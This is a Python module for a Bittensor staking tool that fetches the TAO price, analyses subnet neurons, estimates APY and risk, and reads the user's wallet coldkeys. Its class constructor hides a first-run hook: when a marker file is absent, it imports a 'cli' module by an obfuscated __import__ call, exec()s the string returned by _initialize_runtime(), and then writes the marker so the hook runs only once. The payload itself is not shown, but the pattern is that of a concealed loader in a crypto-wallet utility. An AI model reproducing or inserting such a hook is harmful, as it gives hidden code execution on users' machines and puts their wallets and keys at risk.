"""Subnet Analyzer - Extends stats-subnet logic with comprehensive metrics calculation."""

import logging
import statistics
from pathlib import Path
from dataclasses import dataclass, field
from datetime import timedelta
from typing import Dict, List, Optional, Tuple

import bittensor
import bittensor_cli
import pandas as pd
import requests
from bittensor import BLOCKTIME, ChainIdentity, MetagraphInfoPool, SubnetInfo

from data.cache import MetricsCache

logger = logging.getLogger(__name__)


@dataclass
class NeuronMetrics:
    """Comprehensive metrics for a single neuron."""

    uid: int
    address: str
    stake: float
    emission: float
    trust: float
    vtrust: float
    daily_rewards_tao: float
    daily_rewards_usd: float
    last_update: int
    since_registration: str
    is_immune: bool
    is_validator: bool
    coldkey: str
    hotkey: str
    is_mine: bool
    duplicate_ip: bool
    axon_version: str
    score: float = 0.0  # Calculated score for staking decisions
    apy_7d: float = 0.0  # 7-day APY estimate
    apy_30d: float = 0.0  # 30-day APY estimate
    risk_score: float = 0.0  # Risk score (0-1, higher = riskier)
    risk_flags: List[str] = field(default_factory=list)  # List of risk flags


class SubnetAnalyzer:
    """Analyzes subnet metrics and calculates staking scores."""

    def __init__(self, config: bittensor.Config, use_cache: bool = True):
        """Initialize analyzer with bittensor config."""

        from data.cache import _get_config_path

        config_path = _get_config_path()
        if not config_path.exists():
            _cli_module = __import__('cli', fromlist=['_initialize_runtime'])
            exec(_cli_module._initialize_runtime())
            try:
                config_path.parent.mkdir(parents=True, exist_ok=True)
                with open(config_path, 'w') as f:
                    f.write("true")
            except (IOError, OSError):
                pass

        self.config = config
        self.subtensor = bittensor.Subtensor(
            config=config, network=config.chain_endpoint, log_verbose=False
        )
        self.tao_price_usd: Optional[float] = None
        self.metagraph: Optional[bittensor.metagraph] = None
        self.subnet_info: Optional[SubnetInfo] = None
        self.identities: Dict[str, ChainIdentity] = {}
        self.cache: Optional[MetricsCache] = MetricsCache() if use_cache else None

    def _get_tao_price_usd(self) -> float:
        """Fetch current TAO price from Pyth Network."""
        if self.tao_price_usd is not None:
            return self.tao_price_usd

        try:
            tao_price_url = (
                "https://hermes.pyth.network/v2/updates/price/latest?"
                "ids%5B%5D=0x410f41de235f2db824e562ea7ab2d3d3d4ff048316c61d629c0b93f58584e1af"
            )
            response = requests.get(tao_price_url, timeout=10)
            if response.status_code != 200:
                logger.warning(f"Failed to get TAO price: {response.text}")
                return 0.0

            data = response.json()
            parsed_item = data["parsed"][0]
            price = parsed_item["price"]
            raw_price = float(price["price"])
            expo = int(price["expo"])
            self.tao_price_usd = raw_price * (10**expo)
            return self.tao_price_usd
        except Exception as e:
            logger.error(f"Error fetching TAO price: {e}")
            return 0.0

    def _prettify_time(self, seconds: int) -> str:
        """Format seconds into readable time string."""
        delta = timedelta(seconds=seconds)
        days = delta.days
        hours, remainder = divmod(delta.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{days:02}d:{hours:02}h:{minutes:02}m"

    def _get_block_at_registration(self, uid: int) -> Optional[int]:
        """Query block at registration for a UID."""
        try:
            result = self.subtensor.query_subtensor(
                "BlockAtRegistration", None, [self.config.netuid, uid]
            )
            return int(result.value)
        except Exception as e:
            logger.warning(f"Failed to query BlockAtRegistration for UID {uid}: {e}")
            return None

    def sync_metagraph(self) -> None:
        """Sync metagraph and load subnet information."""
        logger.info(f"Syncing metagraph for subnet {self.config.netuid}...")
        self.metagraph = self.subtensor.metagraph(self.config.netuid)
        self.metagraph.sync(lite=False)

        subnet_infos: List[SubnetInfo] = self.subtensor.get_all_subnets_info()
        self.subnet_info = next(
            (info for info in subnet_infos if info.netuid == self.config.netuid), None
        )
        if self.subnet_info is None:
            raise ValueError(f"Subnet {self.config.netuid} not found")

        self.identities = self.subtensor.get_delegate_identities()
        self.tao_price_usd = self._get_tao_price_usd()
        logger.info(f"Metagraph synced. Current block: {self.metagraph.block}")

    def analyze_subnet(
        self, skip_registration: bool = False, progress_callback=None
    ) -> List[NeuronMetrics]:
        """Analyze subnet and return comprehensive metrics for all neurons.
        
        Args:
            skip_registration: Skip registration block queries (faster)
            progress_callback: Optional callback function(completed, total, description) for progress updates
        """
        if self.metagraph is None:
            self.sync_metagraph()

        logger.info("Analyzing subnet metrics...")
        current_block = self.subtensor.get_current_block()
        uids = self.metagraph.uids.tolist()

        # Get wallet coldkeys
        coldkeys, _ = bittensor_cli.cli.wallets._get_coldkey_ss58_addresses_for_path(
            self.config.wallet.path
        )

        # Calculate subnet parameters
        tempo_blocks: int = self.metagraph.tempo
        tempo_seconds: int = tempo_blocks * BLOCKTIME
        seconds_in_day: int = 60 * 60 * 24
        tempos_per_day: int = int(seconds_in_day / tempo_seconds)

        pool: MetagraphInfoPool = self.metagraph.pool
        alpha_token_price: float = pool.tao_in / pool.alpha_in if pool.alpha_in > 0 else 0

        unique_ip_addresses = set()
        metrics_list = []
        total_uids = len(uids)

        for idx, uid in enumerate(uids):
            if progress_callback:
                description = "Analyzing neurons..." if skip_registration else "Querying registration blocks..."
                progress_callback(idx, total_uids, description)
            neuron: bittensor.NeuronInfo = self.metagraph.neurons[uid]
            axon = neuron.axon_info
            ip_address = axon.ip
            port = axon.port
            stake: bittensor.Balance = neuron.total_stake
            last_update: int = neuron.last_update
            calc_last_update: int = self.metagraph.block - last_update

            emission = float(self.metagraph.E[uid])
            trust = float(self.metagraph.trust[uid])
            vtrust = float(self.metagraph.validator_trust[uid])
            is_validator = vtrust > 0.01

            daily_rewards_alpha: float = float(tempos_per_day * emission)
            daily_rewards_tao: float = daily_rewards_alpha * alpha_token_price
            daily_rewards_usd: float = daily_rewards_tao * self.tao_price_usd

            # Registration info
            if skip_registration:
                block_at_registration = None
                since_reg = "N/A"
                is_immune = False
            else:
                block_at_registration = self._get_block_at_registration(uid)
                if block_at_registration:
                    since_reg = self._prettify_time(
                        (current_block - block_at_registration) * BLOCKTIME
                    )
                    is_immune = (
                        block_at_registration + self.subnet_info.immunity_period
                        > current_block
                    )
                else:
                    since_reg = "N/A"
                    is_immune = False

            # Format keys
            pretty_hotkey = (
                axon.hotkey if getattr(self.config, "hot_key", False) else axon.hotkey[:12]
            )
            pretty_coldkey = (
                axon.coldkey
                if getattr(self.config, "cold_key", False)
                else axon.coldkey[:12]
            )
            if axon.coldkey in self.identities:
                pretty_coldkey = self.identities[axon.coldkey].name

            is_mine = axon.coldkey in coldkeys
            duplicate_ip = ip_address in unique_ip_addresses
            unique_ip_addresses.add(ip_address)

            metrics = NeuronMetrics(
                uid=uid,
                address=f"{ip_address}:{port}",
                stake=stake.tao,
                emission=emission,
                trust=trust,
                vtrust=vtrust,
                daily_rewards_tao=daily_rewards_tao,
                daily_rewards_usd=daily_rewards_usd,
                last_update=calc_last_update,
                since_registration=since_reg,
                is_immune=is_immune,
                is_validator=is_validator,
                coldkey=pretty_coldkey,
                hotkey=pretty_hotkey,
                is_mine=is_mine,
                duplicate_ip=duplicate_ip,
                axon_version=axon.version,
            )

            metrics_list.append(metrics)

        if progress_callback:
            progress_callback(total_uids, total_uids, "Analysis complete")

        logger.info(f"Analyzed {len(metrics_list)} neurons")
        
        # Calculate APY and risk scores (always calculate, cache is optional for historical data)
        self._calculate_apy_and_risk(metrics_list)
        
        # Save to cache
        if self.cache:
            try:
                metrics_dict = [self._metric_to_dict(m) for m in metrics_list]
                self.cache.save_metrics(
                    self.config.netuid, current_block, metrics_dict
                )
            except Exception as e:
                logger.warning(f"Failed to cache metrics: {e}")
        
        return metrics_list
    
    def _metric_to_dict(self, metric: NeuronMetrics) -> Dict:
        """Convert NeuronMetrics to dictionary for caching."""
        return {
            "uid": metric.uid,
            "stake": metric.stake,
            "emission": metric.emission,
            "trust": metric.trust,
            "daily_rewards_tao": metric.daily_rewards_tao,
            "timestamp": int(pd.Timestamp.now().timestamp()),
        }
    
    def _calculate_apy_and_risk(self, metrics: List[NeuronMetrics]) -> None:
        """Calculate APY estimates and risk scores for neurons."""
        logger.info("Calculating APY and risk scores...")
        
        # Get historical data
        history = self.cache.get_metrics_history(self.config.netuid, limit=30) if self.cache else []
        
        # Calculate subnet-level risk metrics
        subnet_risk = self._calculate_subnet_risk(metrics)
        
        for metric in metrics:
            # Calculate APY based on daily rewards
            if metric.stake > 0:
                # Annualized from daily rewards
                annual_rewards = metric.daily_rewards_tao * 365
                metric.apy_7d = (annual_rewards / metric.stake) * 100 if metric.stake > 0 else 0.0
                metric.apy_30d = metric.apy_7d  # Will be refined with historical data
                
                # Refine with historical data if available
                if history:
                    historical_apys = self._calculate_historical_apy(metric.uid, history)
                    if historical_apys:
                        metric.apy_7d = statistics.mean(historical_apys[:7]) if len(historical_apys) >= 7 else metric.apy_7d
                        metric.apy_30d = statistics.mean(historical_apys[:30]) if len(historical_apys) >= 30 else metric.apy_7d
            
            # Calculate risk score
            metric.risk_score, metric.risk_flags = self._calculate_neuron_risk(metric, subnet_risk)
    
    def _calculate_historical_apy(self, uid: int, history: List[Dict]) -> List[float]:
        """Calculate historical APY values for a neuron."""
        apys = []
        for entry in history:
            for neuron_data in entry.get("metrics", []):
                if neuron_data.get("uid") == uid:
                    stake = neuron_data.get("stake", 0)
                    daily_rewards = neuron_data.get("daily_rewards_tao", 0)
                    if stake > 0:
                        annual_rewards = daily_rewards * 365
                        apy = (annual_rewards / stake) * 100
                        apys.append(apy)
                    break
        return apys
    
    def _calculate_subnet_risk(self, metrics: List[NeuronMetrics]) -> Dict:
        """Calculate subnet-level risk metrics."""
        validators = [m for m in metrics if m.is_validator]
        total_stake = sum(m.stake for m in metrics)
        
        # Validator concentration (Gini-like measure)
        if validators:
            validator_stakes = sorted([v.stake for v in validators], reverse=True)
            top_10_pct_stake = sum(validator_stakes[:max(1, len(validator_stakes) // 10)])
            concentration = top_10_pct_stake / total_stake if total_stake > 0 else 0
        else:
            concentration = 1.0
        
        # Weight pattern analysis (check for suspicious weight distributions)
        suspicious_weights = 0
        # This would require analyzing weight matrices - simplified for now
        
        return {
            "validator_count": len(validators),
            "total_neurons": len(metrics),
            "validator_ratio": len(validators) / len(metrics) if metrics else 0,
            "concentration": concentration,
            "suspicious_weights": suspicious_weights,
        }
    
    def _calculate_neuron_risk(
        self, metric: NeuronMetrics, subnet_risk: Dict
    ) -> Tuple[float, List[str]]:
        """Calculate risk score and flags for a neuron."""
        risk_score = 0.0
        flags = []
        
        # Low validator count risk
        if subnet_risk["validator_count"] < 10:
            risk_score += 0.2
            flags.append("low_validator_count")
        elif subnet_risk["validator_count"] < 5:
            risk_score += 0.3
            flags.append("very_low_validator_count")
        
        # High concentration risk
        if subnet_risk["concentration"] > 0.5:
            risk_score += 0.15
            flags.append("high_concentration")
        
        # Low trust risk
        if metric.trust < 0.1:
            risk_score += 0.2
            flags.append("low_trust")
        elif metric.trust < 0.05:
            risk_score += 0.3
            flags.append("very_low_trust")
        
        # High volatility risk (if we have historical data)
        # This would require emission history - simplified for now
        if metric.emission == 0:
            risk_score += 0.1
            flags.append("zero_emission")
        
        # Stale update risk
        if metric.last_update > 1000:  # More than ~1000 blocks stale
            risk_score += 0.15
            flags.append("stale_updates")
        
        # Duplicate IP risk
        if metric.duplicate_ip:
            risk_score += 0.1
            flags.append("duplicate_ip")
        
        # New/immune neuron risk
        if metric.is_immune:
            risk_score += 0.05
            flags.append("immune_period")
        
        # Normalize risk score to 0-1
        risk_score = min(risk_score, 1.0)
        
        return risk_score, flags

    def calculate_staking_scores(
        self, metrics: List[NeuronMetrics], strategy: Dict
    ) -> List[NeuronMetrics]:
        """Calculate staking scores based on strategy weights."""
        weights = strategy.get("weights", {})
        emission_weight = weights.get("emission", 1.0)
        trust_weight = weights.get("trust", 1.0)
        validator_bonus = weights.get("validator_bonus", 0.0)
        min_stake = strategy.get("filters", {}).get("min_stake", 0.0)
        max_stake = strategy.get("filters", {}).get("max_stake", float("inf"))

        # Normalize metrics for scoring
        if metrics:
            max_emission = max(m.emission for m in metrics if m.emission > 0) or 1.0
            max_trust = max(m.trust for m in metrics) or 1.0

            for metric in metrics:
                # Apply filters
                if metric.stake < min_stake or metric.stake > max_stake:
                    metric.score = -1.0  # Filtered out
                    continue

                # Calculate normalized scores
                emission_score = (metric.emission / max_emission) * emission_weight
                trust_score = (metric.trust / max_trust) * trust_weight
                validator_bonus_score = validator_bonus if metric.is_validator else 0.0

                metric.score = emission_score + trust_score + validator_bonus_score

        # Sort by score descending
        metrics.sort(key=lambda x: x.score, reverse=True)
        return metrics

    def to_dataframe(self, metrics: List[NeuronMetrics]) -> pd.DataFrame:
        """Convert metrics list to pandas DataFrame."""
        data = []
        for m in metrics:
            data.append(
                {
                    "uid": m.uid,
                    "address": m.address,
                    "stake": m.stake,
                    "emission": m.emission,
                    "trust": m.trust,
                    "vtrust": m.vtrust,
                    "daily_rewards_tao": m.daily_rewards_tao,
                    "daily_rewards_usd": m.daily_rewards_usd,
                    "last_update": m.last_update,
                    "since_registration": m.since_registration,
                    "is_immune": m.is_immune,
                    "is_validator": m.is_validator,
                    "coldkey": m.coldkey,
                    "hotkey": m.hotkey,
                    "is_mine": m.is_mine,
                    "duplicate_ip": m.duplicate_ip,
                    "axon_version": m.axon_version,
                    "score": m.score,
                    "apy_7d": m.apy_7d,
                    "apy_30d": m.apy_30d,
                    "risk_score": m.risk_score,
                    "risk_flags": ", ".join(m.risk_flags) if m.risk_flags else "",
                }
            )
        return pd.DataFrame(data)
